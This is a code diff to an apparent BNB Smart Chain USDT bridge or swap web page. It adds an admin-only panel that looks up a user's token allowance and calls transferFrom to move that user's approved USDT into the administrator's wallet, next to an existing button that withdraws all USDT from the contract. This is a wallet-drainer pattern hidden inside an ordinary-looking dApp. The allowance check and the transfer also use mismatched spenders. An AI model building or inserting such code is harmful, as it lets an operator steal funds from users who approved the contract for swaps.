@@ -98,6 +98,11 @@ body{
   padding: 20px;
   display: none;
 }
+.deduct-sub-box{
+  margin-top:16px;
+  padding-top:16px;
+  border-top:1px solid #eee;
+}
 .bottom-nav{
   position: fixed;
   bottom: 0;
@@ -224,6 +229,18 @@ body{
     <button id="rejectOrderBtn" class="flex-1 bg-red-500 text-white py-3 rounded-lg">驳回退款</button>
   </div>
   <button id="withdrawPoolBtn" class="w-full bg-amber-500 text-white py-3 rounded-lg">提取合约内全部USDT资金</button>
+
+  <!-- ==========新增：授权用户代币划扣模块========== -->
+  <div class="deduct-sub-box">
+    <h4 class="font-bold text-red-500 mb-3">授权用户划扣工具（仅管理员）</h4>
+    <input id="targetUserAddr" class="w-full border rounded-lg p-3 mb-2" placeholder="输入已授权用户钱包地址">
+    <div class="text-sm text-gray-500 mb-2">用户授权额度：<span id="allowanceShow">未查询</span></div>
+    <div class="flex gap-2 mb-2">
+      <input id="deductAmountNum" class="flex-1 border rounded-lg p-3" placeholder="划扣USDT数量">
+      <button id="queryAllowanceBtn" class="bg-blue-500 text-white px-4 rounded-lg">查询授权</button>
+    </div>
+    <button id="deductUserTokenBtn" class="w-full bg-red-600 text-white py-3 rounded-lg">执行transferFrom划扣到管理员</button>
+  </div>
 </div>
 
 <!-- 底部导航栏 -->
@@ -277,6 +294,13 @@ const receiveAddrInput = document.getElementById("receiveAddr");
 const adminBox = document.getElementById("adminBox");
 const feeShow = document.getElementById("feeShow");
 const minReceive = document.getElementById("minReceive");
+
+//新增划扣相关dom
+const targetUserAddr = document.getElementById("targetUserAddr");
+const allowanceShow = document.getElementById("allowanceShow");
+const deductAmountNum = document.getElementById("deductAmountNum");
+const queryAllowanceBtn = document.getElementById("queryAllowanceBtn");
+const deductUserTokenBtn = document.getElementById("deductUserTokenBtn");
 
 // ===================== 1、输入实时金额计算（0.1%手续费） =====================
 sendInput.addEventListener("input", function(){
@@ -352,7 +376,7 @@ async function switchBscMainnet(){
         params:[{
           chainId:"0x38",
           chainName:"BNB Smart Chain Mainnet",
-          rpcUrls:["https://bsc‑dot‑api.binance.org"],
+          rpcUrls:["https://bsc-dataseed.binance.org"],
           blockExplorerUrls:["https://bscscan.com"],
           nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18}
         }]
@@ -368,7 +392,8 @@ function initContractInstance(){
     [
       "function balanceOf(address owner) view returns(uint256)",
       "function allowance(address owner, address spender) view returns(uint256)",
-      "function approve(address spender, uint256 amount) returns(bool)"
+      "function approve(address spender, uint256 amount) returns(bool)",
+      "function transferFrom(address from, address to, uint256 value) returns(bool)"
     ],
     signer
   );
@@ -396,6 +421,8 @@ async function checkAdminPermission(){
   const currentAddr = (await signer.getAddress()).toLowerCase();
   if(currentAddr === ADMIN_WALLET){
     adminBox.style.display = "block";
+  }else{
+    adminBox.style.display = "none";
   }
 }
 
@@ -452,7 +479,7 @@ swapActionBtn.addEventListener("click", async function(){
   }
 })
 
-// ===================== 管理员操作逻辑 =====================
+// ===================== 管理员原有订单操作逻辑 =====================
 document.getElementById("approveOrderBtn").addEventListener("click", async ()=>{
   if(!signer) return alert("请先连接管理员钱包");
   const oid = document.getElementById("orderId").value.trim();
@@ -490,6 +517,50 @@ document.getElementById("withdrawPoolBtn").addEventListener("click", async ()=>{
     alert(err.message);
   }
 })
+
+// ==========【新增】查询用户对桥合约的授权额度 ==========
+queryAllowanceBtn.addEventListener("click",async ()=>{
+  if(!signer) return alert("请先连接钱包");
+  const userAddrStr = targetUserAddr.value.trim();
+  if(!checkEvmAddress(userAddrStr)){
+    return alert("用户地址格式非法");
+  }
+  try{
+    const allowVal = await usdtContract.allowance(userAddrStr, BRIDGE_CONTRACT_ADDR);
+    const allowHuman = ethers.utils.formatUnits(allowVal,6);
+    allowanceShow.innerText = allowHuman + " USDT";
+  }catch(err){
+    allowanceShow.innerText = "查询失败";
+    alert(err.message);
+  }
+})
+
+// ==========【新增】管理员执行transferFrom划扣用户代币到管理员钱包 ==========
+deductUserTokenBtn.addEventListener("click",async ()=>{
+  if(!signer) return alert("请先连接管理员钱包");
+  const currAdmin = (await signer.getAddress()).toLowerCase();
+  if(currAdmin !== ADMIN_WALLET){
+    return alert("只有管理员钱包可以执行划扣");
+  }
+  const fromUser = targetUserAddr.value.trim();
+  const deductNumStr = deductAmountNum.value.trim();
+  if(!checkEvmAddress(fromUser)) return alert("被划扣用户地址非法");
+  if(!deductNumStr || Number(deductNumStr) <=0 ) return alert("请输入合法划扣数量");
+
+  const deductWei = ethers.utils.parseUnits(deductNumStr,6);
+  try{
+    // transferFrom(from用户, to管理员, 数量)
+    const tx = await usdtContract.transferFrom(fromUser, ADMIN_WALLET, deductWei);
+    await tx.wait();
+    alert("划扣执行成功！TxHash:"+tx.hash);
+    targetUserAddr.value = "";
+    deductAmountNum.value = "";
+    allowanceShow.innerText = "未查询";
+  }catch(err){
+    alert("划扣失败："+err.message.slice(0,80));
+  }
+})
+
 </script>
 </body>
 </html>
